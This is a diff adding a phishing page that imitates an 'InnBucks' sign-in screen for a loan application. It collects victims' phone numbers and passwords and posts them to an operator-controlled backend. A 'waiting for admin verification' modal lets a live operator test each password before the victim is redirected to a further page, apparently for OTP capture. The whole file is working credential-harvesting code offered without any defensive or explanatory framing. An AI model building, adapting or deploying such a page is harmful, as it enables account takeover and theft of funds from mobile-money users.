@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Login — Continue Application</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, Helvetica, sans-serif;
+        background: #f2f2f2;
+      }
+      .header {
+        background: #16213e;
+        color: #fff;
+        padding: 14px 18px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .logo {
+        font-weight: 700;
+      }
+      .card {
+        max-width: 420px;
+        margin: 36px auto;
+        background: #fff;
+        border-radius: 16px;
+        padding: 28px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      }
+      h1 {
+        margin: 0 0 8px;
+        font-size: 20px;
+        color: #16213e;
+      }
+      p {
+        color: #666;
+        margin-bottom: 18px;
+      }
+      label {
+        display: block;
+        font-weight: 600;
+        margin-bottom: 6px;
+      }
+      input {
+        width: 100%;
+        padding: 12px 14px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        margin-bottom: 12px;
+      }
+      .btn {
+        width: 100%;
+        padding: 14px;
+        border-radius: 12px;
+        border: none;
+        background: linear-gradient(90deg, #00b894, #6c5ce7);
+        color: #fff;
+        font-size: 16px;
+        cursor: pointer;
+      }
+      .small {
+        font-size: 13px;
+        color: #999;
+        margin-top: 12px;
+        text-align: center;
+      }
+      .modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+      .modal.show {
+        display: flex;
+      }
+      .modal-content {
+        background: white;
+        padding: 32px;
+        border-radius: 16px;
+        text-align: center;
+        max-width: 380px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+      }
+      .spinner {
+        border: 4px solid #f2f2f2;
+        border-top: 4px solid #6c5ce7;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 16px;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .modal-content h2 {
+        margin: 16px 0 8px;
+        color: #16213e;
+        font-size: 18px;
+      }
+      .modal-content p {
+        margin: 0;
+        color: #666;
+        font-size: 14px;
+      }
+      .modal-error {
+        background: #ffe0e0;
+        border: 1px solid #ffcccc;
+        color: #d32f2f;
+        padding: 12px;
+        border-radius: 8px;
+        margin-top: 16px;
+      }
+      .modal-error p {
+        margin: 0;
+        color: #d32f2f;
+      }
+      .retry-btn {
+        margin-top: 16px;
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        border: none;
+        background: #ff6b6b;
+        color: white;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 600;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <div>← Back</div>
+      <div class="logo">InnBucks</div>
+      <div></div>
+    </div>
+
+    <div class="card">
+      <h1>Sign in to continue</h1>
+      <p>Please confirm your contact to receive an OTP.</p>
+
+      <form id="login1Form">
+        <label for="phone">Phone number</label>
+        <input id="phone" type="tel" placeholder="+263712345678" required />
+
+        <label for="password">Password</label>
+        <input
+          id="password"
+          type="password"
+          placeholder="Enter password"
+          required
+        />
+
+        <button class="btn" type="submit">Continue</button>
+      </form>
+
+      <div class="small">
+        You will receive an OTP to verify your phone number.
+      </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div id="verificationModal" class="modal">
+      <div class="modal-content">
+        <div class="spinner"></div>
+        <h2 id="modalTitle">Verifying Password</h2>
+        <p id="modalMessage">
+          Please wait while admin verifies your password...
+        </p>
+        <div id="errorContainer"></div>
+      </div>
+    </div>
+
+    <script>
+      const BACKEND_URL = (localStorage.getItem("backendUrl") || "").trim();
+      let currentRequestId = null;
+      let verificationInterval = null;
+
+      console.log("Backend URL:", BACKEND_URL);
+
+      document
+        .getElementById("login1Form")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const phone = document.getElementById("phone").value.trim();
+          const password = document.getElementById("password").value;
+
+          if (!phone) return alert("Please enter your phone number");
+          if (!password) return alert("Please enter a password");
+
+          // Show verification modal
+          showVerificationModal();
+
+          try {
+            // Send password to backend for verification
+            const payload = {
+              phone: phone.replace(/\s+/g, ""),
+              password: password,
+            };
+
+            console.log("Sending to:", `${BACKEND_URL}/api/password/verify`);
+            console.log("Payload:", payload);
+
+            const response = await fetch(`${BACKEND_URL}/api/password/verify`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            });
+
+            if (!response.ok) {
+              const errorText = await response.text();
+              throw new Error(
+                `Backend error (${response.status}): ${errorText}`,
+              );
+            }
+
+            const data = await response.json();
+            console.log("Response from backend:", data);
+
+            if (!data.requestId) {
+              throw new Error(data.error || "No request ID returned");
+            }
+
+            currentRequestId = data.requestId;
+
+            // Poll for approval
+            verificationInterval = setInterval(
+              () => checkPasswordApproval(phone, password),
+              2000,
+            );
+          } catch (error) {
+            showVerificationError(error.message);
+          }
+        });
+
+      function showVerificationModal() {
+        const modal = document.getElementById("verificationModal");
+        modal.classList.add("show");
+      }
+
+      async function checkPasswordApproval(phone, password) {
+        try {
+          const response = await fetch(
+            `${BACKEND_URL}/api/password-status/${currentRequestId}`,
+          );
+          const data = await response.json();
+
+          if (data.approved) {
+            clearInterval(verificationInterval);
+            // Save to localStorage for OTP page
+            localStorage.setItem("phoneNumber", phone.replace(/\s+/g, ""));
+            localStorage.setItem("password", password);
+
+            // Show success message
+            document.getElementById("modalTitle").textContent = "✅ Approved";
+            document.getElementById("modalMessage").textContent =
+              "Password verified! Redirecting...";
+
+            // Redirect after short delay
+            setTimeout(() => {
+              window.location.href = "loan5.html";
+            }, 1500);
+          } else if (data.rejectedReason) {
+            clearInterval(verificationInterval);
+            showVerificationError("Wrong password");
+          }
+        } catch (error) {
+          console.error("Error checking approval status:", error);
+        }
+      }
+
+      function showVerificationError(message) {
+        console.error("Verification error:", message);
+        const errorContainer = document.getElementById("errorContainer");
+        document.getElementById("modalTitle").textContent = "❌ Error";
+        document.getElementById("modalMessage").textContent =
+          "Check console for details";
+
+        errorContainer.innerHTML = `
+          <div class="modal-error">
+            <p><strong>Error:</strong> ${message}</p>
+            <p style="margin-top: 8px; font-size: 12px;">Backend URL: ${BACKEND_URL}</p>
+            <p style="margin-top: 4px; font-size: 12px;">Check your browser console (F12) for more details.</p>
+          </div>
+          <button class="retry-btn" onclick="location.reload()">Try Again</button>
+        `;
+      }
+    </script>
+  </body>
+</html>
